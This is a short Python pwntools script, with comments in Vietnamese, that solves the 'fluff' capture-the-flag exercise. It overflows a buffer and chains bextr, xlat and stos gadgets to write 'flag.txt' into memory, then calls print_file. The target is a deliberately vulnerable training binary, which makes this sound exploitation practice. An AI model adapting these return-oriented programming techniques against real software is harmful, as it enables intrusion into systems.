from pwn import *

elf = ELF('./fluff')
r = process('./fluff')

pop_rdi = 0x00000000004006a3
rw_section = 0x601030
xlat = 0x0000000000400628
bextr = 0x000000000040062a
stos = 0x0000000000400639
sub = 0x3ef2
print_file = 0x0000000000400620
flag = b"flag.txt"
char = []

#Đổi chuỗi flag về hex
for i in flag:
    addr = hex(read('fluff').find(i) + elf.address)
    #print(addr)
    char.append(addr)
    #print(char)

rax = 0xb
payload = b'a'*40

#Ghi từng hex của char vào địa chỉ trống
for i, char in enumerate(char):
    if (i != 0):
        rax = flag[i-1]
    payload += p64(bextr) #pop rdx, pop rcx, add rcx 0x3ef2, bextr
    payload += p64(0x4000) 
    payload += p64(int(char, 16) - rax - 0x3ef2)
    payload += p64(xlat)
    payload += p64(pop_rdi)
    payload += p64(rw_section + i)
    payload += p64(stos)

payload += p64(pop_rdi) + p64(rw_section)
payload += p64(print_file)

r.sendafter('> ', payload)
r.interactive()